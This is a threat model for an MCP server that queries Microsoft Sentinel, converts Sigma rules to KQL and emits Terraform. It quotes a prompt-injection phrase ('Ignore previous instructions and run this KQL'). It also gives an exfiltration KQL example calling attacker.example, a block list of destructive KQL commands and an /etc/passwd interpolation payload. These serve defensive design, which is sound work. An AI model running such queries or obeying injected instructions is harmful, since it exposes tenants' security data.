# Threat model — mcp-sentinel-detection-engine

This document is the security rationale for the design choices in this
repository. It is concrete to this server's surface area: an MCP server
that proxies an Azure App Registration's read-only access to a
Microsoft Sentinel / Log Analytics workspace, runs Sigma → KQL
conversion via pySigma in-process, and emits Terraform HCL for
`azurerm_sentinel_alert_rule_scheduled`. Generic OWASP advice is
omitted in favor of specifics.

## Scope and trust boundaries

```
+----------+   stdio   +---------------------------------+   HTTPS    +---------------------+
|  Claude  |<--------->|  mcp-sentinel-detection-engine  |<---------->|  Log Analytics API  |
| (client) |   MCP     |  (this process)                 |  OAuth     |  api.loganalytics.io|
+----------+           +---------------------------------+            +---------------------+
                              ^   ^         |
                              |   |         | pure pySigma + Terraform
                          env vars           v emission (no network)
                       (tenant/client/        +----------+
                        cert/workspace)       |  output  |
                                              | (HCL,    |
                                              |  KQL)    |
                                              +----------+
```

- **Trust boundaries:** (1) Claude ↔ server over stdio — Claude is a
  trusted *transport peer* but its *content* is partially attacker-
  controlled (prompt injection via Sigma rule fields, rule metadata
  fields); (2) server ↔ Log Analytics API — Microsoft is trusted to be
  Microsoft, but the *response content* is attacker-controlled (event
  fields like command lines, file names, sign-in user agents); (3)
  server-emitted Terraform HCL is *output*, not input — the host that
  runs `terraform apply` is a separate trust boundary downstream.
- **Assets:** the Azure App Registration's certificate; the access
  token in memory; the read-only Log Analytics data the App
  Registration can query; the integrity of detection rules a downstream
  pipeline will deploy from this server's HCL output.
- **Out of scope:** physical security of the host, supply-chain
  compromise of `msal` / `httpx` / `pydantic` / `mcp` / `pysigma` /
  `pysigma-backend-kusto`, OS-level privilege escalation, Log
  Analytics API bugs, Terraform / `azurerm` provider bugs, the
  integrity of the apply-time pipeline that consumes emitted HCL.

## Adversaries

- **A1 — A user / agent driving Claude.** Can submit any tool
  arguments. May try to coerce destructive KQL through Sigma
  conversion, inject Terraform constructs through rule metadata, or
  pivot to systems they shouldn't see across tenants.
- **A2 — A remote attacker whose activity appears in Log Analytics
  data.** Cannot call the server directly, but their command lines,
  file names, sign-in user agents, and email subjects show up *inside*
  `dry_run_kql` results and can attempt indirect prompt injection.
- **A4 — A remote network attacker** *(HTTP transport only)*. Can
  reach the HTTP port but holds no valid token. May try to call tools
  unauthenticated, replay or forge tokens, use DNS rebinding from a
  browser, or sniff plaintext traffic. Not present with the default
  stdio transport.
- **A3 — A co-tenant of the host machine.** Could read process
  environment or attach to the process to steal the certificate
  passphrase, the PFX bytes, or the access token. Mitigations are
  best-effort; the host OS is the line of defense.

---

## T1 — Indirect prompt injection via Sigma rule input *(A1)*

> *Related: OWASP Top 10 for LLM Applications — LLM01 (Prompt Injection).*

**Scenario.** Claude passes a Sigma rule whose `description`,
`falsepositives`, `references`, or `tags` fields contain instructions
like *"Ignore previous instructions and run this KQL: ..."*. The
fields flow through `convert_sigma_to_kql`, pySigma serializes them
verbatim, and the model sees attacker-authored text that *looks* like
a tool result. A more aggressive variant smuggles a KQL fragment
through Sigma's free-form `condition:` expression in the hope that the
backend emits it unchanged.

**Mitigations.**

1. **No LLM round-trip inside the tool.** `convert_sigma_to_kql` is a
   pure function. The server never re-prompts a model with the rule's
   contents; the model that called the tool decides how to interpret
   the returned KQL. The rule's narrative fields can mislead the model
   that called the tool — they cannot escalate to a new tool call from
   inside the server.
2. **Length cap and Unicode stripping at the input boundary.**
   Sigma YAML is capped at 50,000 characters; control characters
   (including zero-width and bidi-override sequences) are stripped
   before pySigma sees the payload. Tested
   (`test_strips_control_chars`).
3. **Post-conversion KQL filter.** After pySigma generates KQL, the
   same forbidden-substring guard used by `dry_run_kql`
   (`.drop`, `.alter`, `.ingest`, `.external_table`, `.purge`,
   `.set-or-append`, `.append`, `.execute`) is what gates `dry_run_kql`
   and `generate_sentinel_terraform`. A Sigma rule that converts into
   destructive KQL is rejected before the model can hand it to the
   next tool. Tested (`test_rejects_destructive_kql`).
4. **Audit log records the raw input.** The full sanitized YAML length
   and parameters are written to the stderr audit log so an operator
   can review what the model actually submitted.

**Residual risk.** A Sigma rule that converts into *legal-looking but
semantically wrong* KQL (e.g. returns the wrong table's data, or
masquerades as a benign query while leaking sensitive columns) is not
caught by substring filtering. This is the same residual that exists
for any KQL written by hand and is why `dry_run_kql` returns at most
ten rows: a human or a follow-up review step has to look at the rows
before the rule is promoted to a real Sentinel deployment.

---

## T2 — Credential exposure *(A1, A3)*

**Scenario.** The PFX private key, its passphrase, a workspace ID, or a
derived access token leaks into a tool result, an error message, the
audit log, or an MCP response that the model echoes to the user.

**Mitigations.**

1. **Cert over secret.** Authentication uses X.509 certificate
   credentials rather than a client secret. The private key never has
   to be quoted in a `.env` file or pasted into an MCP client config —
   only the filesystem path to the PFX. Secrets pasted into configs
   are the most common log-scrape exfiltration vector; this design
   avoids that entirely.
2. **Frozen redacted dataclass.** `AzureCredentials.__repr__` redacts
   `cert_passphrase` and never prints PFX bytes. `cert_path` and
   `workspace_id` are logged as-is (they are not secrets). Tested.
3. **Passphrase indirection.** In multi-tenant mode, passphrases are
   referenced by env-var name from the tenants config file (the
   recommended pattern). The config file itself can be checked into a
   sops/age-encrypted repo without leaking the live passphrase.
4. **Tenants-file permissions check.** On POSIX, the server refuses to
   load a tenants config that is group- or world-readable. The
   passphrase env-var pattern means an attacker would need both the
   file *and* the runtime env to assemble usable credentials.
5. **No interpolation in error paths.** `EnvCredentialProvider` raises
   `AuthError` naming the *missing variable* — never the value of
   present ones. MSAL `error_description` strings (which can echo
   attempted input) are dropped; only the short `error` code is
   surfaced.
6. **Audit log allowlist.** The audit module only logs explicit fields
   passed by callers; there is no "log the whole request context"
   convenience path that could accidentally include `Authorization` or
   PFX bytes.
7. **Server-boundary scrubbing.** Unhandled exceptions in `_dispatch`
   become `internal_error` with a fixed string; the original exception
   message is dropped. Tested
   (`test_server_dispatch_maps_unhandled_to_internal`).

**Residual risk.** A user with read access to the host filesystem can
copy the PFX directly. Mitigation moves from "rotate a leaked secret"
to "revoke a leaked cert in Azure portal + rotate the PFX." Store PFX
files on an encrypted volume; rotate the cert annually or on suspected
exposure. Certs resist *log-scrape* exfiltration (unlike a secret quoted
in a config) but not *filesystem* exfiltration — that boundary is the
host OS, not this server. Tenants sourced from a secret store
(T11) remove the PFX from the filesystem entirely.

---

## T3 — KQL injection via converted query *(A1)*

**Scenario.** An adversary crafts a Sigma rule that, after the
`pysigma-backend-kusto` translator runs, produces destructive KQL like
`.drop table users` or `.external_table('https://attacker.example/exfil') <-
SecurityEvent`. The model then naively passes that KQL to
`dry_run_kql` or `generate_sentinel_terraform`, and the operator's
workspace executes it (or the apply pipeline deploys it as a Sentinel
analytics rule).

**Mitigations.**

1. **Forbidden-substring filter applied AFTER conversion AND before
   any HTTP call.** `validation.py` defines `_KQL_FORBIDDEN_SUBSTRINGS`
   (`.drop`, `.alter`, `.ingest`, `.external_table(`,
   `.create-or-alter`, `.set-or-append`, `.purge`, `.append`,
   `.execute`) and applies it to every tool whose input is a KQL
   payload (`dry_run_kql`, `validate_kql_against_schema`,
   `generate_sentinel_terraform`). Tested
   (`test_rejects_destructive_kql`).
2. **`MAX_KQL_LENGTH = 10000`** caps the absolute size of any KQL
   payload before HTTP. The Sigma input is independently capped at
   50,000 characters so a maliciously huge YAML rule cannot starve the
   parser. Tested (`test_dry_run_oversized_query_rejected`).
3. **`Microsoft Sentinel Reader` at the workspace scope cannot execute
   control commands anyway.** The Log Analytics query API
   (`/v1/workspaces/{id}/query`) only accepts read queries; control
   commands require a different endpoint and elevated RBAC. The
   forbidden-substring filter is defense in depth: it stops the dry
   run before it reaches Azure (so misconfigured RBAC can't bite us),
   and it stops `generate_sentinel_terraform` from baking a
   destructive query into HCL that a downstream apply pipeline might
   run with *write* credentials.
4. **`dry_run_kql` enforces server-side `take` clamping.** The tool
   appends `| take <row_limit ≤ 10>` to every query at the server
   boundary. A model that tries to exfiltrate a million rows is
   trivially blocked.

**Residual risk.** A read-only query can still be expensive on the
Log Analytics side; the cost surfaces as 429s, not as compromise (see
T7). A query that *successfully* queries a table the operator did not
intend (e.g. accidentally pulling sensitive data into a Terraform-
emitted rule's `query` body) is not flagged by substring filtering;
operators should review emitted HCL before applying it.

---

## T4 — Token theft from process memory *(A3)*

**Scenario.** A co-tenant on the host (or a malicious dependency)
extracts the cached OAuth access token and uses it from another
machine to impersonate the service principal for up to 1 hour.

**Mitigations.**

1. **Short lifetime.** Log Analytics access tokens default to ~1 h.
   The server does not request extended lifetimes.
2. **In-memory only.** Tokens are held in `TokenManager._cache` (a
   `dict` on the heap). Nothing is written to disk, MSAL is configured
   without a persistent cache, and the server has no token export
   path.
3. **No token logging.** Tokens are never serialized, included in
   `__repr__`, or passed to the audit logger. The `Authorization`
   header is set on the request object only.
4. **Per-tenant cache key.** `(tenant_key, scope)` keying isolates
   each tenant's token. Tested
   (`test_token_manager_per_tenant_cache_isolation`).
5. **Scope is narrow and single-purpose.** Only
   `https://api.loganalytics.io/.default` is requested. A leaked token
   cannot be replayed against Microsoft Graph, the Sentinel management
   API, or any other Azure resource.

**Residual risk.** Any code running inside the same process can read
*every cached tenant's* token, not just one. The hour-long
impersonation window is the worst case per tenant; a compromise of a
host running an N-tenant deployment leaks N tokens. Run the server
under its own dedicated user account; do not co-locate it with code
that processes untrusted input.

---

## T5 — Malicious Terraform emission *(A1)*

**Scenario.** An adversary crafts inputs to `generate_sentinel_terraform`
that produce HCL with code-injection in the `description`, `tactics`,
or `display_name` fields — for example, smuggling a
`${var.secret_token}` interpolation into a string body so the apply
pipeline leaks state into the rule definition. Or the adversary
supplies a `name` that collides with an existing Terraform resource
address so the apply *overwrites* a previously-deployed rule's GUID.

**Mitigations.**

1. **Pydantic v2 strict validation.** `TerraformRuleMetadata` is
   `extra="forbid"`, every field has a length cap, and every field
   that maps to a finite vocabulary (`severity`, `trigger_operator`,
   `tactics`, `techniques`) is validated against a regex or enum
   before emission. Tested
   (`test_rejects_bad_tactic`, `test_rejects_bad_iso_duration`).
2. **HCL escaping at the emission boundary.** `_escape_hcl_string` in
   `terraform_emit.py` neutralizes `\`, `"`, `\n`, `\r`, `\t`, and
   crucially the Terraform interpolation prefixes `${` and `%{`
   (rewritten as `$${` and `%%{`). A description field containing
   `${var.naughty}` is rendered as a literal string, not an
   interpolation. Tested
   (`test_double_quotes_in_description_are_escaped`).
3. **Resource name is a constrained identifier.** The Terraform block
   label (`resource "azurerm_sentinel_alert_rule_scheduled" "<name>"`)
   uses the validated `metadata.name` field, which must match
   `[A-Za-z_][A-Za-z0-9_-]{0,255}`. A caller cannot inject `}` or
   start a new block.
4. **GUID generation is server-side.** The Sentinel `name` attribute
   (which Azure uses as the rule GUID) is derived from
   `uuid5(_NAMESPACE, sha256(metadata.name))` — a deterministic
   function of the validated rule name. A caller cannot smuggle a
   chosen GUID and therefore cannot collide with a known existing
   rule's GUID. The trade-off: two rules with the same `name` will
   resolve to the same GUID by design (so re-running the pipeline is
   idempotent).
5. **Heredoc-safe query body.** The KQL is wrapped in a `<<-EOT ...
   EOT` heredoc, and the marker is automatically extended (`EOTX`,
   `EOTXX`, ...) if `EOT` appears in the query — a caller cannot break
   out of the heredoc. HCL heredocs are templates, so `${` and `%{`
   inside the query body are escaped to `$${` / `%%{` exactly as in
   quoted strings; a query containing `${file("/etc/passwd")}` is
   emitted as an inert literal. Tested
   (`test_heredoc_query_template_sequences_are_escaped`).

**Residual risk.** This server emits HCL; it does not apply it. A
sufficiently broken apply pipeline (running with `Owner` rights, or
trusting the emitted HCL blindly) could still cause damage downstream.
The mitigations above contain the blast radius to "you got a
syntactically valid `azurerm_sentinel_alert_rule_scheduled`," not
"arbitrary HCL with arbitrary side effects." Pair this server with an
apply pipeline that runs `terraform plan` under review.

---

## T6 — Cross-tenant data confusion *(A1, server author)*

**Scenario.** Multi-tenant fan-out under `dry_run_kql` with
`tenant: "*"` aggregates query results from two or more workspaces. A
bug or confused-deputy attack could mis-attribute one tenant's rows to
another (showing Fabrikam alerts under a "contoso" label), or reuse
contoso's cached token to call fabrikam's workspace URL. In a SOC
setting, mis-labelled hunt data is *worse than no data* — it produces
wrong-tenant remediation actions.

**Mitigations.**

1. **Per-tenant MSAL app instance.** `TokenManager` maintains
   `_apps: dict[tenant_key, ConfidentialClientApplication]`. Each app
   is built from one tenant's credentials and uses one authority URL.
   There is no path by which tenant A's `acquire_token_for_client`
   can return tenant B's token.
2. **Per-tenant cache key.** `(tenant_key, scope)` indexing on
   `_cache` prevents token reuse across tenants. Tested
   (`test_token_manager_per_tenant_cache_isolation`).
3. **Per-tenant workspace URL.** `ToolContext.client_for` looks up
   `credentials.workspace_id` *server-side* from the tenant registry
   and builds the Log Analytics URL
   (`/v1/workspaces/{workspace_id}/query`) from it. The caller cannot
   redirect a "contoso" query to a different workspace by manipulating
   tool arguments. Tested
   (`test_explicit_tenant_routes_to_right_credentials`).
4. **Server-injected tenant labels.** Fan-out results are wrapped
   with a `tenant` field set from the *server-side* tenant key —
   never parsed out of the upstream JSON body. An attacker who can
   influence row content cannot influence which tenant label that
   content is filed under. Tested
   (`test_fan_out_aggregates_per_tenant`).
5. **Bounded concurrency, independent failure.** `asyncio.Semaphore`
   serializes per-tenant calls under a concurrency cap; per-tenant
   exceptions are caught inside the fan-out worker and surfaced as
   `{"tenant": k, "error": {...}}` entries. One tenant's failure
   cannot cause another's result to silently inherit its data. Tested
   (`test_fan_out_partial_failure`,
   `test_fan_out_unhandled_exception_per_tenant`).
6. **Tenant key validation.** Caller-supplied `tenant` values are
   matched against `^([A-Za-z0-9_-]{1,64}|\*)$` *and* against the set
   of configured tenants. Unknown keys are rejected as
   `InvalidInputError` *before* any network call. The error message
   does not echo the bad key — preventing it from being used as a
   tenant-existence oracle.

**Residual risk.** A bug in the per-tenant worker that *replaces* a
result with the wrong tenant's data after `gather` returns would still
be possible in principle; the type system does not encode tenant
identity. The fan-out test suite proves the current code does not do
this, but a future contributor could regress it. Reviewers of changes
to `tools/_runtime.py` and `tools/dry_run.py` should pay particular
attention to the order of operations between `dispatch` and the
per-tenant `await`.

---

## T6a — Sensitive custom table names via live schema metadata *(A1)*

**Scenario.** `validate_kql_against_schema` with `tenant` set fetches
the workspace's full table list from `GET /v1/workspaces/{id}/metadata`.
Custom table names (`CompanyXSecretEvents_CL`) can themselves reveal
sensitive information, and the metadata body is upstream-controlled.

**Mitigations.**

1. **Same trust as query rows.** `live_schema.parse_metadata` keeps only
   names matching the KQL identifier pattern and drops everything else.
2. **No enumeration through errors.** An unknown table in live mode
   returns "does not exist in this tenant's workspace" without listing
   the live tables (the bundled-snapshot error still lists the public
   snapshot tables). Tested
   (`test_live_schema_unknown_table_does_not_leak_table_names`).
3. **Audit the fetch, not the body.** `schema-fetched` records the
   tenant and table *count* only.
4. **Opt-in.** Omitting `tenant` keeps the tool pure and offline.

**Residual risk.** A caller with access to a tenant can confirm whether a
specific table exists by naming it. That is no more than `dry_run_kql`
already reveals with the same credentials.

---

## T7 — Rate-limit abuse against Log Analytics *(A1)*

**Scenario.** An adversary triggers many `dry_run_kql` calls — either
in a tight loop against one tenant or via `tenant: "*"` fan-out — to
exhaust the Log Analytics query API rate limit. This blocks legitimate
SOC use of the same App Registration, produces a noisy 429 storm in
the logs, and can mask other anomalies during a real incident.

**Mitigations.**

1. **Bounded retries.** `SentinelClient` retries 429/5xx at most
   `_MAX_RETRIES = 3` times per call. After that, callers see a
   structured `rate_limited` error. Tested
   (`test_rate_limit_exhausts_retries`).
2. **Respect `Retry-After`.** If Log Analytics provides a
   `Retry-After`, the client honors it, capped at 60 s to bound
   worst-case latency. Tested
   (`test_rate_limit_retries_then_succeeds`).
3. **Full-jitter exponential backoff.** When `Retry-After` is absent,
   delays are random in `[0, min(2^attempt, 8)]` seconds, so
   concurrent clients do not synchronize their retries.
4. **Per-tenant fan-out semaphore.** `dispatch` uses an
   `asyncio.Semaphore(max_fan_out=5)` so a single `tenant: "*"` call
   cannot saturate every tenant's quota simultaneously. Tested
   (`test_fan_out_respects_max_fan_out`).
5. **`row_limit` ≤ 10 and 60-second server timeout.** The dry-run is
   priced as cheaply as the Log Analytics API will allow; the
   per-call cost an attacker can inflict is small.
6. **Caller observability.** Every retry path produces an audit log
   record, so an operator can spot abuse.
7. **Per-tenant token-bucket quota.** `ratelimit.RateLimiter` keeps a
   bucket per `(tenant_key, tool_name)` (default 60 req/min, burst 10;
   override per tenant with a `rate_limit` block in the tenants config).
   An empty bucket fails that tenant's call with `rate_limited` before
   any HTTP request; other tenants in the same fan-out are unaffected.
   Tested (`test_fan_out_quota_isolated_per_tenant`).
8. **Per-tenant circuit breaker.** After `circuit_breaker_threshold`
   (default 5) consecutive calls end in an upstream 429 with retries
   exhausted, the tenant cools off for `circuit_breaker_cooloff_seconds`
   (default 300). During cool-off calls return `rate_limited`
   immediately with no HTTP attempt. Afterwards one probe call is let
   through. Tested (`test_breaker_short_circuits_without_http`).
   `rate-limit-quota-exhausted` and `circuit-breaker-*` state changes
   are audited.

**Residual risk.** Limits are process-local: several server processes
sharing one App Registration each get their own quota. Cluster-wide
quota needs a shared store and is out of scope. Within one process,
abuse from a trusted MCP client is now rate-bounded per tenant, but the
operator should still monitor the audit stream.

---

## T8 — Transport-layer attacks on the HTTP transport *(A4)*

**Scenario.** With `--transport http`, anyone who can reach the port can
send MCP requests. Unlike Defender XDR, this server has two damage
vectors behind that port: read (`dry_run_kql` and live schema against the
workspace) and *effective* write (HCL from `generate_sentinel_terraform`
that a downstream apply pipeline may deploy). An attacker may send
unauthenticated requests, forge tokens (`alg: none`, HS/RS algorithm
confusion), replay a captured token, present a long-lived token, rebind
DNS from a victim's browser, or sniff a plaintext connection.

**Mitigations.**

1. **No unauthenticated mode.** The server refuses to start in HTTP mode
   unless a signing key, `iss`, and `aud` are configured
   (`BearerTokenValidator.from_env`). `BearerAuthMiddleware` checks every
   request before it reaches the MCP session manager. Tested
   (`test_http_rejects_unauthenticated_and_does_not_echo_token`).
2. **Fixed algorithm list per key type.** An HS256 secret accepts only
   HS256. A public key accepts only RS256/ES256 and is refused if the file
   contains a private key. `alg: none` and HS256-signed-with-public-key
   tokens are rejected. Tested (`test_alg_none_rejected`,
   `test_rs256_public_key`).
3. **Short-lived, instance-bound tokens.** `iss`, `aud`, `iat`, `exp`,
   and `jti` are required. `exp - iat` may not exceed 15 minutes by
   default. Tokens issued in the future are rejected. A unique `aud` per
   server instance stops a token minted for one instance from working on
   another.
4. **Replay.** The short TTL bounds the replay window by default. With
   `MCP_SENTINEL_HTTP_AUTH_SINGLE_USE=1`, every `jti` is accepted exactly
   once (seen-set pruned at expiry). Tested
   (`test_single_use_rejects_replay`).
5. **No token echo.** Rejections return a generic `401` with
   `WWW-Authenticate: Bearer error="invalid_token"`. The audit line
   records a reason code (`expired`, `wrong_audience`, ...) and the
   client host, never the token.
6. **DNS-rebinding protection.** The MCP SDK's
   `TransportSecuritySettings` allow-list rejects unexpected `Host`
   headers and all browser `Origin`s. Tested
   (`test_http_rejects_dns_rebinding_host`).
7. **Loopback by default, TLS supported.** The default bind is
   `127.0.0.1`. Binding a non-loopback address without
   `MCP_SENTINEL_HTTP_TLS_CERT` logs `http-transport-plaintext-non-loopback`.
8. **Shared secret hygiene.** The HS256 secret file must be `0600` and
   at least 32 bytes.

**Residual risk.** Any holder of a valid token can use every tool for the
token's lifetime. There are no per-tool scopes yet. Without single-use
mode, a captured token can be replayed within its TTL, so TLS is required
for any non-loopback deployment. Per-tenant rate limits (T7) still apply
to HTTP callers.

---

## T9 — Management-plane scope expansion *(A1, A2)*

**Scenario.** v0.3 adds `list_deployed_sentinel_rules` and
`detect_rule_drift`, which read alert rules from Azure Resource Manager.
That needs a token for `https://management.azure.com/.default`, which is
far broader than the Log Analytics query scope: the same token could, if
the App Registration held write roles, create, change or delete *any*
ARM resource the principal can reach. Separately, rule display names,
descriptions and queries returned by ARM are attacker-influenced
content (A2 could have named a rule, or an insider could have edited
one in the portal).

**Why the broader scope is justified.** The Sentinel rule inventory and
rule definitions are only exposed on the management plane; there is no
Log Analytics data-plane equivalent. Drift detection is impossible
without it.

**Mitigations.**

1. **RBAC, not the token, is the real boundary.** The documented role
   is `Microsoft Sentinel Reader` at the workspace scope. ARM enforces
   that on every request, so a token for a reader-only principal
   cannot write regardless of its audience. Operators must not grant
   the App Registration `Contributor` / `Sentinel Contributor`.
2. **GET-only client.** `ManagementClient` exposes `get`,
   `list_alert_rules` and `get_alert_rule` and nothing else; there is no
   code path that sends `PUT` / `PATCH` / `DELETE` / `POST` to ARM.
3. **Scope allowlist.** `TokenManager.get_token(scope=...)` rejects any
   scope other than Log Analytics and `management.azure.com`. Tested
   (`test_token_manager_rejects_unlisted_scope`). Tokens are cached per
   `(tenant_key, scope)` so the two audiences never mix. Tested
   (`test_token_manager_caches_per_scope`).
4. **Server-side ARM coordinates.** `subscription_id`,
   `resource_group` and `workspace_name` come from the tenant config,
   are validated at load time (GUID / ARM naming rules), and are
   URL-quoted into the path. The caller can't point a request at a
   different subscription. A caller-supplied `rule_id` must be a GUID
   and is URL-quoted as well. Tested
   (`test_json_provider_validates_management_fields`,
   `test_management_client_get_rule_quotes_id`).
5. **Same-origin pagination.** `nextLink` cursors come from the
   upstream response. `AzureRestClient._build_url` only follows absolute
   URLs that start with the configured ARM base URL, so a tampered
   cursor can't redirect the bearer token to a third-party host.
   Tested (`test_management_client_refuses_foreign_next_link`).
   Pagination is capped at 20 pages.
6. **Opt-in per tenant.** Management access is only enabled for tenants
   that configure the ARM coordinates; the others get a structured
   `invalid_input` error without any token being minted.
7. **Untrusted output.** `list_deployed_sentinel_rules` returns a fixed
   summary projection (no query bodies); `detect_rule_drift` returns
   live values only as diff data. Tool descriptions tell the model to
   treat them as untrusted, which is the same posture as T1 / `dry_run_kql`.

**Residual risk.** An operator who grants the App Registration a write
role at subscription scope turns a prompt-injection compromise of the
*server process* (not just the model) into ARM write access. The
server can't detect over-privileged role assignments; that's a
deployment review item.

---

## T10 — Subprocess execution and state isolation in `terraform_plan` *(A1)*

**Scenario.** `terraform_plan` executes the `terraform` binary on
model-supplied HCL. An attacker who controls the HCL could try to run
arbitrary commands (`provisioner "local-exec"`, `data "external"`),
read local files (`file()`, `templatefile()`), exfiltrate environment
secrets, pull in remote code (`module` sources), or tamper with
Terraform state. Running `apply` would turn a model-side compromise
into a production change.

**Mitigations.**

1. **Strict HCL allowlist.** `hcl_parse.parse_rules` accepts only
   top-level `resource "azurerm_sentinel_alert_rule_scheduled"` blocks
   whose attributes are literals (strings, bools, ints, string lists,
   heredocs) or the single reference `var.log_analytics_workspace_id`.
   Nested blocks (`provisioner`, `lifecycle`, `dynamic`), other
   resource types, `data` / `module` / `locals` / `provider` blocks,
   function calls and unescaped `${` / `%{` templates are all rejected
   before any file is written. Tested (`tests/test_hcl_parse.py`,
   `test_plan_rejects_bad_input`).
2. **Plan only.** The runner executes exactly `init`, `plan -lock=false
   -out=plan.bin` and `show -json plan.bin`. There's no `apply` code
   path. `-lock=false` means the plan identity only needs read access
   to the state blob. Tested (`test_plan_happy_path` asserts the
   command sequence).
3. **No shell.** `asyncio.create_subprocess_exec` with an argv list;
   the binary is resolved with `shutil.which`. The workspace ID is
   validated against the ARM resource-ID shape before it goes into a
   `-var=` argument.
4. **Throwaway working directory.** Each run uses a fresh
   `tempfile.mkdtemp` directory that is removed in a `finally` block,
   including on failure and timeout. Tested (the scratch dir is gone
   after both success and failure).
5. **Environment allowlist, separate identity.** The child gets
   `PATH`, `ARM_*`, proxy/TLS variables and `TF_PLUGIN_CACHE_DIR`
   only. The server's `AZURE_*` certificate variables, passphrases and
   tenants file are not passed, and `HOME` is set to the scratch
   directory so Terraform can't fall back to a cached Azure CLI login.
   The tool refuses to run if `ARM_CLIENT_ID` equals any App
   Registration the server itself queries with. Tested
   (`test_build_child_env_allowlist`,
   `test_plan_rejects_same_identity`).
6. **State isolation.** The backend comes from the operator-controlled
   `MCP_SENTINEL_TF_BACKEND_CONFIG` file and is never model-supplied.
   It should point at state owned by the separate plan identity; the
   MCP server's App Registration has no access to it.
7. **Bounded runtime.** Per-stage timeouts (init 180 s, plan 300 s,
   show 60 s) kill the whole process group, including provider plugin
   children. Output is truncated to 20 000 characters.
8. **Audit.** Each invocation logs the sha256 of the input HCL, the
   target workspace resource ID and the outcome stage.

**Residual risk.** `terraform init` downloads the `azurerm` provider
from the public registry (supply chain; use `TF_PLUGIN_CACHE_DIR` or a
network mirror to pin it). `terraform plan` refreshes state using the
plan identity's credentials, so that identity needs read access to the
workspace's alert rules. Plan output includes the rule definitions,
which the model already supplied.

---

## T11 — Secret-store credential retrieval and the bootstrap-identity boundary *(A1, A3)*

**Scenario.** With a `key_vault` or `vault` block in the tenants
config, the PFX for each tenant's App Registration lives in Azure Key
Vault or HashiCorp Vault rather than on disk. That adds a new
credential, the **bootstrap identity** (a managed identity, a separate
App Registration, or a Vault token / AppRole / Kubernetes role), whose
compromise reveals *every* tenant certificate it can read. It also
creates new leak paths: secret-store URLs, secret names, and token
sources showing up in error messages, the PFX body showing up in logs,
and a tampered config pointing the server at an attacker-controlled
"vault" that serves a certificate of the attacker's choosing.

**Mitigations.**

1. **Separate bootstrap identity, read-only scope.** The PFX can't
   fetch itself, so Key Vault is reached with a distinct identity whose
   token is scoped to the vault resource only
   (`https://vault.azure.net/.default`, or the sovereign-cloud
   equivalent derived from the vault hostname). Grant it `Key Vault
   Secrets User` on the one vault, and nothing on the Log Analytics
   workspace. For HashiCorp Vault, the policy attached to the
   token / AppRole / Kubernetes role should allow `read` on
   `<mount>/data/<path>` only. A stolen bootstrap credential then
   reveals certificates but cannot query Sentinel by itself. Each of
   those certificates is still bound to its own read-only Log Analytics
   role (T2).
2. **Destination pinning.** Key Vault URLs must be `https` on a
   `*.vault.azure.net` / `*.vault.azure.cn` /
   `*.vault.usgovcloudapi.net` host with no path, query, port or
   userinfo (`credentials/keyvault.validate_vault_url`). Vault
   addresses must be `https` (plain `http` only for
   `localhost`/`127.0.0.1` dev servers), and mount, path and namespace
   must be `[A-Za-z0-9_.-]` segments with no `..`. A config edit can't
   point the bearer token at an arbitrary host or path-traverse the
   Vault API. Tested (`test_validate_vault_url_rejects_without_echo`,
   `test_parse_vault_block_rejects`).
3. **No oracle in errors.** Every fetch failure raises `AuthError` with
   a fixed message plus at most the HTTP status code. The vault URL,
   certificate/secret name, secret path, token env-var name and token
   value never appear. Tested
   (`test_fetch_http_errors_do_not_echo_vault_or_cert`,
   `test_read_errors_do_not_echo_path_or_token_source`). Unexpected
   exceptions inside a backend become a generic
   `Failed to retrieve certificate from secret store`
   (`CachingPfxSource`).
4. **Audit the fetch, not the body.** `secret-store-fetch-succeeded` /
   `-failed` records carry only the tenant key, the store type
   (`key_vault` / `hashicorp_vault`), whether the certificate changed
   (`rotated`), and on failure the exception class. The PFX bytes,
   the passphrase and the bootstrap token are never logged.
5. **Memory only.** The PFX is decoded and, if it has a passphrase,
   decrypted once in memory (`credentials/pfx.normalize_pfx`), then
   passed to MSAL as a PEM key + certificate. Nothing is written to a
   temp file. Fetches are lazy (first token acquisition), so a
   secret-store outage degrades `dry_run_kql` to `auth_failure`
   rather than blocking server start or the offline tools.
6. **Rotation without restart.** Fetched certificates are cached for
   one hour. `TokenManager` fingerprints the PFX bytes and rebuilds the
   tenant's MSAL app when they change (audited as
   `certificate-rotated`), so a Key Vault auto-rotation or a Vault
   secret update is picked up on a following token refresh.
7. **Vault token hygiene.** Response-wrapped tokens are unwrapped
   exactly once. Tokens are renewed via `auth/token/renew-self` once
   the remaining TTL falls under the 60 s leeway. Non-renewable
   AppRole / Kubernetes tokens are replaced by a fresh login, and a
   `403` on read gets one re-login before failing (covers out-of-band
   revocation).

**Residual risk.** The bootstrap identity is now the
highest-value credential on the host. Whoever holds it can read every
tenant PFX it is authorized for, so it is the thing to monitor
(Key Vault diagnostic logs, Vault audit device). On a VM, any process
that can reach IMDS can mint the managed-identity token, so co-tenant
processes on the same host (A3) still share that trust. The decrypted
key lives in process memory for the process lifetime, as in T4. A
cluster-wide revocation fan-out (forcing every server process to drop
a certificate immediately) is out of scope: revocation takes effect
when Azure AD rejects the certificate or within the one-hour cache TTL.

---

## Non-goals

- **PII scrubbing inside returned rows.** The server returns whatever
  Log Analytics returns. If your environment requires DLP, run it
  downstream of the MCP client.
- **Per-user authorization within the App Registration.** Each
  configured tenant uses one service principal; the server does not
  re-authorize requests against an end-user identity. Tenants who
  need per-user RBAC should layer it in front of the MCP client, not
  inside the server.
- **End-to-end encryption of stdio.** stdio is a process-local pipe;
  if the threat model requires network-layer crypto, use the HTTP
  transport over TLS (T8).
- **Write-scope rule deployment.** Emission only. The apply step,
  with its write credentials and `terraform plan` review gate, lives
  in a separate pipeline that this server never touches.
